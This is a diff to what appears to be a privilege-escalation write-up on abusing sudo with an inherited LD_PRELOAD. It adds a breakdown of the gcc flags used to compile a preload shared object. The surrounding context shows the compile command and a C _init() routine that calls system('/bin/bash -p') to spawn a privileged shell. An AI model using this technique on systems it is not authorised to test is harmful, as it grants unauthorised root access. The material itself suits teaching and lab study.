@@ -45,6 +45,14 @@ LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. L
 
 We compile the below C code using ```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c```
 
+Command breakdown
+- gcc: The GNU Compiler Collection, a standard compiler for C and C++ language.
+- fPIC: This flag tells the compiler to generate position-independent code, which is necessary for shared libraries.
+- shared: This flag instructs the compiler to create a shared object rather than an executable.
+- nostartfiles: This option prevents linking against the standard start files, which is suitable for shared libraries.
+- o /tmp/preload.so: Specifies the output file name and location for the shared object, in this case, /tmp/preload.so.
+/home/user/tools/sudo/preload.c: This is the input source file that contains the C code to be compiled
+
 ```
 #include <stdio.h>
 #include <sys/types.h>
@@ -56,4 +64,7 @@ void _init() {
 	system("/bin/bash -p");
 }
 ```
+
+
+
 
